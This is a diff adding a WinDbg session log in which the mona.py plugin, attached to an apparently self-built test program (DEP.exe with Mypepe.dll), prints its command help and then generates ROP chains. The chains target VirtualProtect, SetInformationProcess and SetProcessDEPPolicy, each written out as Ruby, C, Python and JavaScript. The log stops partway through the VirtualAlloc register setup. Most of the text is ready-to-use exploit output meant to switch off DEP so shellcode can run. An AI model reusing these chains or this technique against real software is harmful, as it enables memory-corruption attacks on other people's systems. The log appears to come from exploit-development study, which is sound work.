@@ -1,0 +1,844 @@
+
+Microsoft (R) Windows Debugger Version 10.0.14321.1024 X86
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+*** wait with pending attach
+
+************* Symbol Path validation summary **************
+Response                         Time (ms)     Location
+Deferred                                       SRV*C:\symbols*http://msdl.microsoft.com/download/symbols
+Symbol search path is: SRV*C:\symbols*http://msdl.microsoft.com/download/symbols
+Executable search path is: 
+ModLoad: 00f80000 00f87000   C:\Users\ricna\Desktop\35\DEP\DEP.exe
+ModLoad: 77180000 77303000   C:\WINDOWS\SYSTEM32\ntdll.dll
+ModLoad: 74100000 741e0000   C:\WINDOWS\System32\KERNEL32.DLL
+ModLoad: 74a00000 74ba1000   C:\WINDOWS\System32\KERNELBASE.dll
+ModLoad: 74430000 74510000   C:\WINDOWS\System32\ucrtbase.dll
+ModLoad: 616b0000 616c5000   C:\WINDOWS\SYSTEM32\VCRUNTIME140.dll
+ModLoad: 78000000 78040000   C:\Users\ricna\Desktop\35\DEP\Mypepe.dll
+(5290.2b4c): Break instruction exception - code 80000003 (first chance)
+eax=006c0000 ebx=00000000 ecx=772240c0 edx=772240c0 esi=772240c0 edi=772240c0
+eip=771f0790 esp=00d1feb4 ebp=00d1fee0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+ntdll!DbgBreakPoint:
+771f0790 cc              int     3
+0:001> lm
+start    end        module name
+00f80000 00f87000   DEP        (deferred)             
+616b0000 616c5000   VCRUNTIME140   (deferred)             
+74100000 741e0000   KERNEL32   (deferred)             
+74430000 74510000   ucrtbase   (deferred)             
+74a00000 74ba1000   KERNELBASE   (deferred)             
+77180000 77303000   ntdll      (pdb symbols)          c:\symbols\wntdll.pdb\9D5EBB427B3449C0BA160009A90706251\wntdll.pdb
+78000000 78040000   Mypepe     (deferred)             
+0:001> .reload
+Reloading current modules
+.......
+0:001> lm
+start    end        module name
+00f80000 00f87000   DEP        (deferred)             
+616b0000 616c5000   VCRUNTIME140   (deferred)             
+74100000 741e0000   KERNEL32   (deferred)             
+74430000 74510000   ucrtbase   (deferred)             
+74a00000 74ba1000   KERNELBASE   (deferred)             
+77180000 77303000   ntdll      (pdb symbols)          c:\symbols\wntdll.pdb\9D5EBB427B3449C0BA160009A90706251\wntdll.pdb
+78000000 78040000   Mypepe     (deferred)             
+0:001> lm
+start    end        module name
+00f80000 00f87000   DEP        (deferred)             
+616b0000 616c5000   VCRUNTIME140   (deferred)             
+74100000 741e0000   KERNEL32   (deferred)             
+74430000 74510000   ucrtbase   (deferred)             
+74a00000 74ba1000   KERNELBASE   (deferred)             
+77180000 77303000   ntdll      (pdb symbols)          c:\symbols\wntdll.pdb\9D5EBB427B3449C0BA160009A90706251\wntdll.pdb
+78000000 78040000   Mypepe     (deferred)             
+0:001> .reload -f
+Reloading current modules
+.*** WARNING: Unable to verify checksum for C:\Users\ricna\Desktop\35\DEP\DEP.exe
+
+
+Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.
+Run !sym noisy before .reload to track down problems loading symbols.
+
+......
+0:001> lm
+start    end        module name
+00f80000 00f87000   DEP      C (private pdb symbols)  C:\Users\ricna\Documents\Visual Studio 2015\Projects\ConsoleApplication4\Release\ConsoleApplication4.pdb
+616b0000 616c5000   VCRUNTIME140   (private pdb symbols)  c:\symbols\vcruntime140.i386.pdb\87F8B303F87E49D2A009E36621F4DD731\vcruntime140.i386.pdb
+74100000 741e0000   KERNEL32   (pdb symbols)          c:\symbols\wkernel32.pdb\E88980D95F9941FBAE728782D05D8C5B1\wkernel32.pdb
+74430000 74510000   ucrtbase   (pdb symbols)          c:\symbols\ucrtbase.pdb\14E1CCBEC74D4CE09B29CAD25BF7EC9D1\ucrtbase.pdb
+74a00000 74ba1000   KERNELBASE   (pdb symbols)          c:\symbols\wkernelbase.pdb\4DAD89FB110744179A0B1D6A168D930D1\wkernelbase.pdb
+77180000 77303000   ntdll      (pdb symbols)          c:\symbols\wntdll.pdb\9D5EBB427B3449C0BA160009A90706251\wntdll.pdb
+78000000 78040000   Mypepe     (pdb symbols)          c:\symbols\msvcrt.pdb\366734DA2\msvcrt.pdb
+0:001> !load pykd.pyd
+0:001> !py mona
+Hold on...
+[+] Command used:
+!py C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\mona.py
+     'mona' - Exploit Development Swiss Army Knife - WinDBG (32bit)
+     Plugin version : 2.0 r567
+     PyKD version 0.2.0.29
+     Written by Corelan - https://www.corelan.be
+     Project page : https://github.com/corelan/mona
+    |------------------------------------------------------------------|
+    |        _ __ ___    ___   _ __    __ _     _ __   _   _           |
+    |       | '_ ` _ \  / _ \ | '_ \  / _` |   | '_ \ | | | |          |
+    |       | | | | | || (_) || | | || (_| | _ | |_) || |_| |          |
+    |       |_| |_| |_| \___/ |_| |_| \__,_|(_)| .__/  \__, |          |
+    |                                          |_|     |___/           |
+    |                                                                  |
+    |------------------------------------------------------------------|
+
+Global options :
+----------------
+You can use one or more of the following global options on any command that will perform
+a search in one or more modules, returning a list of pointers :
+ -n                     : Skip modules that start with a null byte. If this is too broad, use
+                          option -cp nonull instead
+ -o                     : Ignore OS modules
+ -p <nr>                : Stop search after <nr> pointers.
+ -m <module,module,...> : only query the given modules. Be sure what you are doing !
+                          You can specify multiple modules (comma separated)
+                          Tip : you can use -m *  to include all modules. All other module criteria will be ignored
+                          Other wildcards : *blah.dll = ends with blah.dll, blah* = starts with blah,
+                          blah or *blah* = contains blah
+ -cm <crit,crit,...>    : Apply some additional criteria to the modules to query.
+                          You can use one or more of the following criteria :
+                          aslr,safeseh,rebase,nx,os
+                          You can enable or disable a certain criterium by setting it to true or false
+                          Example :  -cm aslr=true,safeseh=false
+                          Suppose you want to search for p/p/r in aslr enabled modules, you could call
+                          !mona seh -cm aslr
+ -cp <crit,crit,...>    : Apply some criteria to the pointers to return
+                          Available options are :
+                          unicode,ascii,asciiprint,upper,lower,uppernum,lowernum,numeric,alphanum,nonull,startswithnull,unicoderev
+                          Note : Multiple criteria will be evaluated using 'AND', except if you are looking for unicode + one crit
+ -cpb '\x00\x01'        : Provide list with bad chars, applies to pointers
+                          You can use .. to indicate a range of bytes (in between 2 bad chars)
+ -x <access>            : Specify desired access level of the returning pointers. If not specified,
+                          only executable pointers will be returned.
+                          Access levels can be one of the following values : R,W,X,RW,RX,WX,RWX or *
+
+Usage :
+-------
+
+ !mona <command> <parameter>
+
+Available commands and parameters :
+
+? / eval             | Evaluate an expression
+allocmem / alloc     | Allocate some memory in the process
+assemble / asm       | Convert instructions to opcode. Separate multiple instructions with #
+bpseh / sehbp        | Set a breakpoint on all current SEH Handler function pointers
+breakfunc / bf       | Set a breakpoint on an exported function in on or more dll's
+breakpoint / bp      | Set a memory breakpoint on read/write or execute of a given address
+bytearray / ba       | Creates a byte array, can be used to find bad characters
+changeacl / ca       | Change the ACL of a given page
+compare / cmp        | Compare contents of a binary file with a copy in memory
+config / conf        | Manage configuration file (mona.ini)
+copy / cp            | Copy bytes from one location to another
+dump                 | Dump the specified range of memory to a file
+dumplog / dl         | Dump objects present in alloc/free log file
+dumpobj / do         | Dump the contents of an object
+egghunter / egg      | Create egghunter code
+encode / enc         | Encode a series of bytes
+filecompare / fc     | Compares 2 or more files created by mona using the same output commands
+fillchunk / fchunk   | Fill a heap chunk referenced by a register
+find / f             | Find bytes in memory
+findmsp / findmsf    | Find cyclic pattern in memory
+findwild / fw        | Find instructions in memory, accepts wildcards
+flow / flw           | Simulate execution flows, including all branch combinations
+fwptr / fwp          | Find Writeable Pointers that get called
+geteat / eat         | Show EAT of selected module(s)
+getiat / iat         | Show IAT of selected module(s)
+getpc                | Show getpc routines for specific registers
+gflags / gf          | Show current GFlags settings from PEB.NtGlobalFlag
+header               | Read a binary file and convert content to a nice 'header' string
+heap                 | Show heap related information
+help                 | show help
+hidedebug / hd       | Attempt to hide the debugger
+info                 | Show information about a given address in the context of the loaded application
+infodump / if        | Dumps specific parts of memory to file
+jmp / j              | Find pointers that will allow you to jump to a register
+jop                  | Finds gadgets that can be used in a JOP exploit
+kb / kb              | Manage Knowledgebase data
+modules / mod        | Show all loaded modules and their properties
+noaslr               | Show modules that are not aslr or rebased
+nosafeseh            | Show modules that are not safeseh protected
+nosafesehaslr        | Show modules that are not safeseh protected, not aslr and not rebased
+offset               | Calculate the number of bytes between two addresses
+pageacl / pacl       | Show ACL associated with mapped pages
+pattern_create / pc  | Create a cyclic pattern of a given size
+pattern_offset / po  | Find location of 4 bytes in a cyclic pattern
+peb / peb            | Show location of the PEB
+rop                  | Finds gadgets that can be used in a ROP exploit and do ROP magic with them
+ropfunc              | Find pointers to pointers (IAT) to interesting functions that can be used in your ROP chain
+seh                  | Find pointers to assist with SEH overwrite exploits
+sehchain / exchain   | Show the current SEH chain
+skeleton             | Create a Metasploit module skeleton with a cyclic pattern for a given type of exploit
+stackpivot           | Finds stackpivots (move stackpointer to controlled area)
+stacks               | Show all stacks for all threads in the running application
+string / str         | Read or write a string from/to memory
+suggest              | Suggest an exploit buffer structure
+teb / teb            | Show TEB related information
+tobp / 2bp           | Generate WinDBG syntax to create a logging breakpoint at given location
+unicodealign / ua    | Generate venetian alignment code for unicode stack buffer overflow
+update / up          | Update mona to the latest version
+
+Want more info about a given command ?  Run !mona help 
+
+0:001> !py mona rop -m Mypepe
+Hold on...
+[+] Command used:
+!py C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\mona.py rop -m Mypepe
+
+---------- Mona command started on 2017-01-14 07:47:23 (v2.0, rev 567) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+    - Only querying modules Mypepe
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+[+] Preparing output file '_rop_progress_DEP.exe_21136.log'
+    - (Re)setting logfile _rop_progress_DEP.exe_21136.log
+[+] Progress will be written to _rop_progress_DEP.exe_21136.log
+[+] Maximum offset : 40
+[+] (Minimum/optional maximum) stackpivot distance : 8
+[+] Max nr of instructions : 6
+[+] Split output into module rop files ? False
+[+] Enumerating 22 endings in 1 module(s)...
+    - Querying module Mypepe.dll
+    - Search complete :
+       Ending : RETN 0x0C, Nr found : 2
+       Ending : RETN, Nr found : 2000
+       Ending : RETN 0x08, Nr found : 21
+       Ending : RETN 0x02, Nr found : 2
+       Ending : RETN 0x10, Nr found : 7
+       Ending : RETN 0x00, Nr found : 9
+       Ending : RETN 0x12, Nr found : 1
+       Ending : RETN 0x14, Nr found : 1
+       Ending : RETN 0x04, Nr found : 71
+    - Filtering and mutating 2114 gadgets
+      - Progress update : 500 / 2114 items processed (Sat 2017/01/14 07:47:32 AM) - (23%)
+      - Progress update : 1000 / 2114 items processed (Sat 2017/01/14 07:47:40 AM) - (47%)
+      - Progress update : 1500 / 2114 items processed (Sat 2017/01/14 07:47:48 AM) - (70%)
+      - Progress update : 2000 / 2114 items processed (Sat 2017/01/14 07:47:57 AM) - (94%)
+      - Progress update : 2114 / 2114 items processed (Sat 2017/01/14 07:47:58 AM) - (100%)
+[+] Creating suggestions list
+[+] Processing suggestions
+[+] Launching ROP generator
+[+] Attempting to produce rop chain for VirtualProtect
+    Step 1/7: esi
+[+] Searching from 0x78000000 to 0x78040000
+    Step 2/7: ebp
+    Step 3/7: ebx
+    Step 4/7: edx
+    Step 5/7: ecx
+    Step 6/7: edi
+    Step 7/7: eax
+[+] Attempting to produce rop chain for SetInformationProcess
+    Step 1/6: ebp
+    Step 2/6: edx
+    Step 3/6: ecx
+    Step 4/6: ebx
+    Step 5/6: eax
+    Step 6/6: edi
+[+] Attempting to produce rop chain for SetProcessDEPPolicy
+    Step 1/3: ebp
+    Step 2/3: ebx
+    Step 3/3: edi
+[+] Attempting to produce rop chain for VirtualAlloc
+    Step 1/7: esi
+[+] Searching from 0x78000000 to 0x78040000
+    Step 2/7: ebp
+    Step 3/7: ebx
+    Step 4/7: edx
+    Step 5/7: ecx
+    Step 6/7: edi
+    Step 7/7: eax
+[+] ROP chains written to file rop_chains.txt
+
+################################################################################
+
+Register setup for VirtualProtect() :
+--------------------------------------------
+ EAX = NOP (0x90909090)
+ ECX = lpOldProtect (ptr to W address)
+ EDX = NewProtect (0x40)
+ EBX = dwSize
+ ESP = lPAddress (automatic)
+ EBP = ReturnTo (ptr to jmp esp)
+ ESI = ptr to VirtualProtect()
+ EDI = ROP NOP (RETN)
+ --- alternative chain ---
+ EAX = ptr to &VirtualProtect()
+ ECX = lpOldProtect (ptr to W address)
+ EDX = NewProtect (0x40)
+ EBX = dwSize
+ ESP = lPAddress (automatic)
+ EBP = POP (skip 4 bytes)
+ ESI = ptr to JMP [EAX]
+ EDI = ROP NOP (RETN)
+ + place ptr to "jmp esp" on stack, below PUSHAD
+--------------------------------------------
+
+
+ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
+----------------------------------------------------------
+
+*** [ Ruby ] ***
+
+  def create_rop_chain()
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = 
+    [
+      0x7802bd1d,  # POP EBP # RETN [Mypepe.dll] 
+      0x7802bd1d,  # skip 4 bytes [Mypepe.dll]
+      0x780271d6,  # POP EBX # RETN [Mypepe.dll] 
+      0x00000201,  # 0x00000201-> ebx
+      0x78029084,  # POP EDX # RETN [Mypepe.dll] 
+      0x00000040,  # 0x00000040-> edx
+      0x78024a75,  # POP ECX # RETN [Mypepe.dll] 
+      0x78037204,  # &Writable location [Mypepe.dll]
+      0x78010edb,  # POP EDI # RETN [Mypepe.dll] 
+      0x7800b281,  # RETN (ROP NOP) [Mypepe.dll]
+      0x7801b3bd,  # POP ESI # RETN [Mypepe.dll] 
+      0x780041ed,  # JMP [EAX] [Mypepe.dll]
+      0x78009a1b,  # POP EAX # RETN [Mypepe.dll] 
+      0x74507170,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT ucrtbase.dll]
+      0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+      0x7800f7c1,  # ptr to 'push esp # ret ' [Mypepe.dll]
+    ].flatten.pack("V*")
+
+    return rop_gadgets
+
+  end
+
+
+  # Call the ROP chain generator inside the 'exploit' function :
+
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ C ] ***
+
+  #define CREATE_ROP_CHAIN(name, ...) \
+    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
+    unsigned int name[name##_length / sizeof(unsigned int)]; \
+    create_rop_chain(name, ##__VA_ARGS__);
+
+  int create_rop_chain(unsigned int *buf, unsigned int )
+  {
+    // rop chain generated with mona.py - www.corelan.be
+    unsigned int rop_gadgets[] = {
+      0x7802bd1d,  // POP EBP // RETN [Mypepe.dll] 
+      0x7802bd1d,  // skip 4 bytes [Mypepe.dll]
+      0x780271d6,  // POP EBX // RETN [Mypepe.dll] 
+      0x00000201,  // 0x00000201-> ebx
+      0x78029084,  // POP EDX // RETN [Mypepe.dll] 
+      0x00000040,  // 0x00000040-> edx
+      0x78024a75,  // POP ECX // RETN [Mypepe.dll] 
+      0x78037204,  // &Writable location [Mypepe.dll]
+      0x78010edb,  // POP EDI // RETN [Mypepe.dll] 
+      0x7800b281,  // RETN (ROP NOP) [Mypepe.dll]
+      0x7801b3bd,  // POP ESI // RETN [Mypepe.dll] 
+      0x780041ed,  // JMP [EAX] [Mypepe.dll]
+      0x78009a1b,  // POP EAX // RETN [Mypepe.dll] 
+      0x74507170,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT ucrtbase.dll]
+      0x78009791,  // PUSHAD // ADD AL,80 // RETN [Mypepe.dll] 
+      0x7800f7c1,  // ptr to 'push esp // ret ' [Mypepe.dll]
+    };
+    if(buf != NULL) {
+      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
+    };
+    return sizeof(rop_gadgets);
+  }
+
+  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
+  CREATE_ROP_CHAIN(rop_chain, );
+  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
+  // unsigned int rop_chain[256];
+  // int rop_chain_length = create_rop_chain(rop_chain, );
+
+*** [ Python ] ***
+
+  def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      0x7802bd1d,  # POP EBP # RETN [Mypepe.dll] 
+      0x7802bd1d,  # skip 4 bytes [Mypepe.dll]
+      0x780271d6,  # POP EBX # RETN [Mypepe.dll] 
+      0x00000201,  # 0x00000201-> ebx
+      0x78029084,  # POP EDX # RETN [Mypepe.dll] 
+      0x00000040,  # 0x00000040-> edx
+      0x78024a75,  # POP ECX # RETN [Mypepe.dll] 
+      0x78037204,  # &Writable location [Mypepe.dll]
+      0x78010edb,  # POP EDI # RETN [Mypepe.dll] 
+      0x7800b281,  # RETN (ROP NOP) [Mypepe.dll]
+      0x7801b3bd,  # POP ESI # RETN [Mypepe.dll] 
+      0x780041ed,  # JMP [EAX] [Mypepe.dll]
+      0x78009a1b,  # POP EAX # RETN [Mypepe.dll] 
+      0x74507170,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT ucrtbase.dll]
+      0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+      0x7800f7c1,  # ptr to 'push esp # ret ' [Mypepe.dll]
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ JavaScript ] ***
+
+  //rop chain generated with mona.py - www.corelan.be
+  rop_gadgets = unescape(
+    "%ubd1d%u7802" + // 0x7802bd1d : ,# POP EBP # RETN [Mypepe.dll] 
+    "%ubd1d%u7802" + // 0x7802bd1d : ,# skip 4 bytes [Mypepe.dll]
+    "%u71d6%u7802" + // 0x780271d6 : ,# POP EBX # RETN [Mypepe.dll] 
+    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
+    "%u9084%u7802" + // 0x78029084 : ,# POP EDX # RETN [Mypepe.dll] 
+    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
+    "%u4a75%u7802" + // 0x78024a75 : ,# POP ECX # RETN [Mypepe.dll] 
+    "%u7204%u7803" + // 0x78037204 : ,# &Writable location [Mypepe.dll]
+    "%u0edb%u7801" + // 0x78010edb : ,# POP EDI # RETN [Mypepe.dll] 
+    "%ub281%u7800" + // 0x7800b281 : ,# RETN (ROP NOP) [Mypepe.dll]
+    "%ub3bd%u7801" + // 0x7801b3bd : ,# POP ESI # RETN [Mypepe.dll] 
+    "%u41ed%u7800" + // 0x780041ed : ,# JMP [EAX] [Mypepe.dll]
+    "%u9a1b%u7800" + // 0x78009a1b : ,# POP EAX # RETN [Mypepe.dll] 
+    "%u7170%u7450" + // 0x74507170 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT ucrtbase.dll]
+    "%u9791%u7800" + // 0x78009791 : ,# PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+    "%uf7c1%u7800" + // 0x7800f7c1 : ,# ptr to 'push esp # ret ' [Mypepe.dll]
+    ""); //  : 
+
+
+--------------------------------------------------------------------------------------------------
+
+
+################################################################################
+
+Register setup for SetInformationProcess() :
+--------------------------------------------
+ EAX = SizeOf(ExecuteFlags) (0x4)
+ ECX = &ExecuteFlags (ptr to 0x00000002)
+ EDX = ProcessExecuteFlags (0x22)
+ EBX = NtCurrentProcess (0xffffffff)
+ ESP = ReturnTo (automatic)
+ EBP = ptr to NtSetInformationProcess()
+ ESI = <not used>
+ EDI = ROP NOP (4 byte stackpivot)
+--------------------------------------------
+
+
+ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
+---------------------------------------------------------------
+
+*** [ Ruby ] ***
+
+  def create_rop_chain()
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = 
+    [
+      0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
+      0x74b7881c,  # ptr to &SetInformationProcess() (skipped module criteria, check if pointer is reliable !) [IAT KERNELBASE.dll]
+      0x780289e1,  # POP EDX # RETN [Mypepe.dll] 
+      0x00000022,  # 0x00000022-> edx
+      0x78011b8e,  # POP ECX # RETN [Mypepe.dll] 
+      0x780376c8,  # &0x00000002 [Mypepe.dll]
+      0x78004b2e,  # POP EBX # RETN [Mypepe.dll] 
+      0xffffffff,  # 0xffffffff-> ebx
+      0x78015602,  # POP EAX # RETN [Mypepe.dll] 
+      0x00000004,  # 0x00000004-> eax
+      0x7801d250,  # POP EDI # RETN [Mypepe.dll] 
+      0x7801d250,  # skip 4 bytes [Mypepe.dll]
+      0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+    ].flatten.pack("V*")
+
+    return rop_gadgets
+
+  end
+
+
+  # Call the ROP chain generator inside the 'exploit' function :
+
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ C ] ***
+
+  #define CREATE_ROP_CHAIN(name, ...) \
+    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
+    unsigned int name[name##_length / sizeof(unsigned int)]; \
+    create_rop_chain(name, ##__VA_ARGS__);
+
+  int create_rop_chain(unsigned int *buf, unsigned int )
+  {
+    // rop chain generated with mona.py - www.corelan.be
+    unsigned int rop_gadgets[] = {
+      0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into ebp
+      0x74b7881c,  // ptr to &SetInformationProcess() (skipped module criteria, check if pointer is reliable !) [IAT KERNELBASE.dll]
+      0x780289e1,  // POP EDX // RETN [Mypepe.dll] 
+      0x00000022,  // 0x00000022-> edx
+      0x78011b8e,  // POP ECX // RETN [Mypepe.dll] 
+      0x780376c8,  // &0x00000002 [Mypepe.dll]
+      0x78004b2e,  // POP EBX // RETN [Mypepe.dll] 
+      0xffffffff,  // 0xffffffff-> ebx
+      0x78015602,  // POP EAX // RETN [Mypepe.dll] 
+      0x00000004,  // 0x00000004-> eax
+      0x7801d250,  // POP EDI // RETN [Mypepe.dll] 
+      0x7801d250,  // skip 4 bytes [Mypepe.dll]
+      0x78009791,  // PUSHAD // ADD AL,80 // RETN [Mypepe.dll] 
+    };
+    if(buf != NULL) {
+      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
+    };
+    return sizeof(rop_gadgets);
+  }
+
+  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
+  CREATE_ROP_CHAIN(rop_chain, );
+  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
+  // unsigned int rop_chain[256];
+  // int rop_chain_length = create_rop_chain(rop_chain, );
+
+*** [ Python ] ***
+
+  def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
+      0x74b7881c,  # ptr to &SetInformationProcess() (skipped module criteria, check if pointer is reliable !) [IAT KERNELBASE.dll]
+      0x780289e1,  # POP EDX # RETN [Mypepe.dll] 
+      0x00000022,  # 0x00000022-> edx
+      0x78011b8e,  # POP ECX # RETN [Mypepe.dll] 
+      0x780376c8,  # &0x00000002 [Mypepe.dll]
+      0x78004b2e,  # POP EBX # RETN [Mypepe.dll] 
+      0xffffffff,  # 0xffffffff-> ebx
+      0x78015602,  # POP EAX # RETN [Mypepe.dll] 
+      0x00000004,  # 0x00000004-> eax
+      0x7801d250,  # POP EDI # RETN [Mypepe.dll] 
+      0x7801d250,  # skip 4 bytes [Mypepe.dll]
+      0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ JavaScript ] ***
+
+  //rop chain generated with mona.py - www.corelan.be
+  rop_gadgets = unescape(
+    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into ebp
+    "%u881c%u74b7" + // 0x74b7881c : ,# ptr to &SetInformationProcess() (skipped module criteria, check if pointer is reliable !) [IAT KERNELBASE.dll]
+    "%u89e1%u7802" + // 0x780289e1 : ,# POP EDX # RETN [Mypepe.dll] 
+    "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
+    "%u1b8e%u7801" + // 0x78011b8e : ,# POP ECX # RETN [Mypepe.dll] 
+    "%u76c8%u7803" + // 0x780376c8 : ,# &0x00000002 [Mypepe.dll]
+    "%u4b2e%u7800" + // 0x78004b2e : ,# POP EBX # RETN [Mypepe.dll] 
+    "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
+    "%u5602%u7801" + // 0x78015602 : ,# POP EAX # RETN [Mypepe.dll] 
+    "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
+    "%ud250%u7801" + // 0x7801d250 : ,# POP EDI # RETN [Mypepe.dll] 
+    "%ud250%u7801" + // 0x7801d250 : ,# skip 4 bytes [Mypepe.dll]
+    "%u9791%u7800" + // 0x78009791 : ,# PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+    ""); //  : 
+
+
+--------------------------------------------------------------------------------------------------
+
+
+################################################################################
+
+Register setup for SetProcessDEPPolicy() :
+--------------------------------------------
+ EAX = <not used>
+ ECX = <not used>
+ EDX = <not used>
+ EBX = dwFlags (ptr to 0x00000000)
+ ESP = ReturnTo (automatic)
+ EBP = ptr to SetProcessDEPPolicy()
+ ESI = <not used>
+ EDI = ROP NOP (4 byte stackpivot)
+--------------------------------------------
+
+
+ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
+---------------------------------------------------------------------------------------------------------------
+
+*** [ Ruby ] ***
+
+  def create_rop_chain()
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = 
+    [
+      0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
+      0x7801e059,  # POP EBX # RETN [Mypepe.dll] 
+      0x78037000,  # &0x00000000 [Mypepe.dll]
+      0x78004c48,  # POP EDI # RETN [Mypepe.dll] 
+      0x78004c48,  # skip 4 bytes [Mypepe.dll]
+      0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+    ].flatten.pack("V*")
+
+    return rop_gadgets
+
+  end
+
+
+  # Call the ROP chain generator inside the 'exploit' function :
+
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ C ] ***
+
+  #define CREATE_ROP_CHAIN(name, ...) \
+    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
+    unsigned int name[name##_length / sizeof(unsigned int)]; \
+    create_rop_chain(name, ##__VA_ARGS__);
+
+  int create_rop_chain(unsigned int *buf, unsigned int )
+  {
+    // rop chain generated with mona.py - www.corelan.be
+    unsigned int rop_gadgets[] = {
+      0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
+      0x7801e059,  // POP EBX // RETN [Mypepe.dll] 
+      0x78037000,  // &0x00000000 [Mypepe.dll]
+      0x78004c48,  // POP EDI // RETN [Mypepe.dll] 
+      0x78004c48,  // skip 4 bytes [Mypepe.dll]
+      0x78009791,  // PUSHAD // ADD AL,80 // RETN [Mypepe.dll] 
+    };
+    if(buf != NULL) {
+      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
+    };
+    return sizeof(rop_gadgets);
+  }
+
+  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
+  CREATE_ROP_CHAIN(rop_chain, );
+  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
+  // unsigned int rop_chain[256];
+  // int rop_chain_length = create_rop_chain(rop_chain, );
+
+*** [ Python ] ***
+
+  def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
+      0x7801e059,  # POP EBX # RETN [Mypepe.dll] 
+      0x78037000,  # &0x00000000 [Mypepe.dll]
+      0x78004c48,  # POP EDI # RETN [Mypepe.dll] 
+      0x78004c48,  # skip 4 bytes [Mypepe.dll]
+      0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ JavaScript ] ***
+
+  //rop chain generated with mona.py - www.corelan.be
+  rop_gadgets = unescape(
+    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
+    "%ue059%u7801" + // 0x7801e059 : ,# POP EBX # RETN [Mypepe.dll] 
+    "%u7000%u7803" + // 0x78037000 : ,# &0x00000000 [Mypepe.dll]
+    "%u4c48%u7800" + // 0x78004c48 : ,# POP EDI # RETN [Mypepe.dll] 
+    "%u4c48%u7800" + // 0x78004c48 : ,# skip 4 bytes [Mypepe.dll]
+    "%u9791%u7800" + // 0x78009791 : ,# PUSHAD # ADD AL,80 # RETN [Mypepe.dll] 
+    ""); //  : 
+
+
+--------------------------------------------------------------------------------------------------
+
+
+################################################################################
+
+Register setup for VirtualAlloc() :
+--------------------------------------------
+ EAX = NOP (0x90909090)
+ ECX = flProtect (0x40)
+ EDX = flAllocationType (0x1000)
+ EBX = dwSize
+ ESP = lpAddress (automatic)
+ EBP = ReturnTo (ptr to jmp esp)
+ ESI = ptr to VirtualAlloc()
+ EDI = ROP NOP (RETN)
+ --- alternative chain ---
+ EAX = ptr to &VirtualAlloc()
+ ECX = flProtect (0x40)
+ EDX = flAllocationType (0x1000)
+ EBX = dwSize
+ ESP = lpAddress (automatic)
+ EBP = POP (skip 4 bytes)
+ ESI = ptr to JMP [EAX]
+ EDI = ROP NOP (RETN)
+ + place ptr to "jmp esp" on stack, below PUSHAD
+--------------------------------------------
+
+
